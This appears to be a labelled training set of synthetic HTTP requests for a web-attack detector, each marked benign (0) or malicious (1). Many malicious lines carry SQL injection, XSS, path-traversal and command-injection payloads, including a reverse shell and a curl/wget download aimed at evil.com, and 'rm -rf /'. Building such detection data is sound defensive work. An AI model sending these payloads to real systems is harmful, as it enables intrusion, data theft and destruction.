DELETE /api/search?tags=test+user&q=684&age=%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60&limit=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /js/app.js content=306&age=248&date=best%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20Doe&password=109&status=929 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /js/app.js search=admin+access+request&city=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&order_id=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /register action=John+Doe&user_id=thank+you&lang=723&tags=test%20admin%27%23%20user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/users?title=John+Doe&id=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/users?content=admin%27%23&quantity=680&product_id=884 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /login?search=685&old_password=366&username=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /dashboard last_name=system%20%27%20OR%201%3D1--%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/search?title=356&password=754&content=thank+you&order=test+user&token=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /login format=admin+access+request&first_name=hello+world&limit=please+find+attached&new_password=this%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20comment&order_id=65 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/reports author=123%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20order&first_name=I+would+like+to+order&tracking=hello+world&password=482 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /dashboard?sort=618&filter=43&order_id=902&quantity=test%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /products/123?product_id=936&new_password=admin%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /contact filters=922&password=test%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20request&price_min=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /users/456?tag=test+user&old_password=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&quantity=714&type=441&new_password=850 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /docs/api quantity=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /contact?username=516&tags=793&title=511 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /help/faq?user_id=hello%20%7C%20cat%20/etc/passwd%20attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /profile?phone=thank%20%3B%20ls%20-la%20user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /css/style.css view=650&token=968&filter=I%20%26%20whoami%20world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /dashboard?password=admin%27--&category=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /js/app.js?category=44&username=admin%27/%2A&city=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /help/faq?search_term=test+user&price_min=best+regards&filter=please+find+attached&name=thank+you&new_password=420 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /products/123?old_password=449&type=592&rating=894&search_term=best+regards User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /about?title=this+is+a+normal+comment&quantity=477&view=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/reports?type=42&search_term=344&rating=380&sort=contact+me+at+email@example.com&id=admin+access+request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /js/app.js email=910&order_id=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/search new_password=846&session=system+log+entry&sort=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/reports?color=56 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /register?new_password=system+log+entry&age=best+regards&filter=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/search?first_name=679&filter=I+would+like+to+order&name=system+log+entry&comment=688 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /api/v1/data?tracking=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&email=196&region=John+Doe&session=596 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /dashboard?category=686&title=74&id=202 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /api/v2/analytics?type=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&session=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /api/orders first_name=123%20%7C%20curl%20http%3A//evil.com/backdoor%20regards&color=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /js/app.js?first_name=9&page=my+address+is&price_max=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--&action=I+would+like+to+order&date=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /login?tags=123%20../../../etc/passwd%20attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/users?content=123+Main+St&tag=444&order_id=459&category=%27%3B%20DROP%20TABLE%20users--&token=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /profile lang=hello%20%27%20OR%201%3D1--%20St&id=377 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /images/logo.png format=John+Doe&token=this+is+a+normal+comment&quantity=system%20%3Csvg/onload%3Dalert%281%29%3E%20attached&product_id=950 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /js/app.js region=38&session=127&action=969&first_name=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /users/456?color=admin+access+request&search_term=%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29&last_name=this+is+a+normal+comment&search=3&user_id=18 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /settings lang=please+find+attached&last_name=admin+access+request&view=198 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /login?page=my+address+is&category=I+would+like+to+order&product_id=....//....//....//etc/passwd&search=243 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /docs/api?filters=test+user&phone=test+user&sort=system+log+entry&type=system+log+entry&q=844 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /about?email=best+regards&region=this+is+a+normal+comment&order_id=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/products?search_term=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&token=thank+you&action=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /posts/789?filters=951&password=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /products/123?price_min=805&columns=system+log+entry&password=764&filter=295 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /api/search?id=system+log+entry&token=hello+world&last_name=62&date=please%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20request&tracking=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /css/style.css email=434&format=file%3A///etc/passwd&age=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /js/app.js?name=65&author=321&lang=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/orders first_name=admin%27%20OR%20%271%27%3D%271&q=92 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /api/v1/data rating=best+regards&view=224 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /api/orders?filters=943&age=please%20..%25252f..%25252f..%25252fetc%25252fpasswd%20user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/reports?product_id=John+Doe&status=736&sort=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/products filters=admin%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/users tracking=%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /docs/api?price_max=system+log+entry&tracking=659&phone=545&email=852&password=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /css/style.css?first_name=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&page=339&rating=144 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /css/style.css?tracking=858&phone=this+is+a+normal+comment&author=this%20%27%20AND%201%3D1--%20is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/products?password=thank+you&last_name=29&age=contact%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20you&rating=988 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /help/faq phone=699&category=my+address+is&price_min=477&search=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/v1/data color=hello%20%27%3B%20DROP%20TABLE%20users--%20Doe&status=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/v1/data?price_min=this+is+a+normal+comment&order=39&view=682&date=647 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /docs/api?rating=my+address+is&user_id=thank+you&comment=205&category=997 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /images/logo.png limit=602&view=123+Main+St&email=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /settings?id=best+regards&last_name=123+Main+St&date=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&filter=708&page=580 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/users category=779&date=thank+you&filter=123+Main+St&q=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /docs/api?type=%26%20nc%20-e%20/bin/bash%20evil.com%204444 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /users/456?phone=hello+world&order=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/v2/analytics id=%3B%20ls%20-la User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /login session=185&product_id=admin%27%23 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /profile search=180&search_term=40&new_password=please+find+attached&color=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /settings?token=584&tag=313&filter=256 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /api/search?password=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /register filters=271 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /profile columns=226&tag=best%20..%25252f..%25252f..%25252fetc%25252fpasswd%20world&region=230&status=397 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/users product_id=%27%20AND%20%27x%27%3D%27x User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /docs/api page=673&action=191&token=357&password=199&rating=%3B%20rm%20-rf%20/ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /dashboard rating=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E&phone=test+user&id=838 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /products/123 order_id=hello+world&session=267&price_max=I%20%3Csvg/onload%3Dalert%281%29%3E%20attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /contact user_id=contact+me+at+email@example.com&category=test+user&product_id=please+find+attached&price_max=337&status=..%25252f..%25252f..%25252fetc%25252fpasswd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/reports?filter=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&session=881&lang=853 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /register lang=test+user&search_term=970&last_name=John%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /dashboard?filters=hello+world&order_id=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /profile?product_id=I%20%27%20AND%20SLEEP%285%29--%20entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /images/logo.png rating=this%20%3Csvg/onload%3Dalert%281%29%3E%20email%40example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /images/logo.png format=hello+world&password=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /products/123?view=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /images/logo.png format=489&page=please+find+attached&search=contact+me+at+email@example.com&username=%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--&view=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /about?view=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /api/reports?filter=540&date=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&old_password=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /css/style.css?password=contact%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20regards&color=261&category=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /register?view=I%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/v2/analytics rating=I+would+like+to+order&first_name=561 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /images/logo.png password=461 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /api/v2/analytics?username=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&search_term=I+would+like+to+order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /login price_max=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/search?action=752&comment=contact+me+at+email@example.com&sort=%3B%20wget%20http%3A//evil.com/shell.sh&order_id=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /css/style.css tracking=hello+world&status=system%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/v1/data?q=..%25252f..%25252f..%25252fetc%25252fpasswd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/reports?phone=123+Main+St&category=%3Csvg%20onload%3Dalert%281%29%3E&filter=790 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /users/456 id=..%25252f..%25252f..%25252fetc%25252fpasswd&tags=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /css/style.css?lang=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--&tag=668 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /images/logo.png?filter=182&region=contact+me+at+email@example.com&age=system%20%27%20AND%20%27x%27%3D%27x%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /contact color=%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?price_min=710&tag=659&last_name=system+log+entry&columns=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&comment=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /images/logo.png page=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /images/logo.png id=816&limit=638 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /api/v1/data?search_term=535&filter=please%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20attached&view=this+is+a+normal+comment&category=755&last_name=663 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /settings?name=../../../etc/passwd&date=admin+access+request&rating=hello+world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /register?user_id=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /users/456?search=524&action=contact+me+at+email@example.com&format=795&search_term=41 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /about order_id=John%20%27%20AND%201%3D2--%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /settings?tags=system%20%7Cc%27a%27t%20/etc/passwd%20email%40example.com&columns=system+log+entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /users/456 id=441&status=thank+you&q=359&action=%7C%20cat%20/etc/passwd User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /docs/api?status=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /settings?token=123+Main+St&filters=717&username=123%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /help/faq author=%3Csvg%20onload%3Dalert%281%29%3E&price_max=123+Main+St&city=hello+world&content=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /users/456?lang=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&columns=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /help/faq?tracking=this%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /images/logo.png?q=this+is+a+normal+comment&quantity=my+address+is&password=714&city=954 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /contact?phone=312&user_id=admin%20%26%20whoami%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /posts/789?status=test+user&format=123%20%27%3B%20DROP%20TABLE%20users--%20regards&first_name=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /contact?tag=333&status=system%201%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--%20is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /profile?old_password=525&page=548&tracking=287 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /dashboard?id=I+would+like+to+order&user_id=82&age=608 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /api/v1/data?order_id=211&title=704&view=23 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /api/orders?color=contact+me+at+email@example.com&price_min=hello+world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/products order_id=%27%20AND%201%3D2--&name=hello+world&q=844&color=test+user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /api/reports city=admin+access+request&price_min=I+would+like+to+order&last_name=hello%20%27%20AND%20%27x%27%3D%27x%20order&format=647 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /users/456 first_name=John%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /posts/789?name=I+would+like+to+order&columns=186&action=217&first_name=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/v1/data status=admin+access+request&token=923&order_id=56&phone=best%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /posts/789 view=my+address+is&user_id=381&region=288&limit=49&price_min=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /posts/789 region=240 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /js/app.js?last_name=John+Doe&status=633&price_min=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /settings?search_term=602&action=%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd&order_id=936&password=please+find+attached&tags=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/users content=system+log+entry&email=John%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20Doe&quantity=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /images/logo.png?author=file%3A///etc/passwd&price_max=454&age=admin+access+request&last_name=179 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /login title=%27%20OR%20%271%27%3D%271%27-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /login tag=best%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20world&format=test+user&city=contact+me+at+email@example.com&quantity=886&username=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/users?title=best%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/reports?action=I+would+like+to+order&age=this+is+a+normal+comment&tag=please+find+attached&new_password=546&email=hello%20....//....//....//etc/passwd%20request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /about action=contact+me+at+email@example.com&email=my+address+is&color=607&category=best+regards&type=941 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /register?order=hello+world&email=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /api/v1/data?color=252&date=228&old_password=this%20%27%20AND%20%27x%27%3D%27y%20entry&last_name=27 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /help/faq?username=my%20%3B%20rm%20-rf%20/%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /contact token=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /js/app.js age=contact+me+at+email@example.com&city=....//....//....//etc/passwd&order_id=391&columns=555&last_name=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /posts/789 status=%60id%60&city=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /login sort=789 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /settings session=John%20%27%20OR%20%271%27%3D%271%27--%20you&token=316&columns=373&sort=99&type=497 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /images/logo.png?new_password=870&view=best+regards&city=John%20%27%20AND%201%3D1--%20comment&type=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/search?email=521&columns=hello%20admin%27%20OR%20%271%27%3D%271%20comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /contact type=my%20%27%3B%20DROP%20TABLE%20users--%20Doe&tag=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /login?city=please%20%27%20AND%20%27x%27%3D%27x%20attached&date=824 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/orders rating=this%20%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--%20attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/search title=system+log+entry&color=test%20admin%27%23%20is&filter=888 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /about?content=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
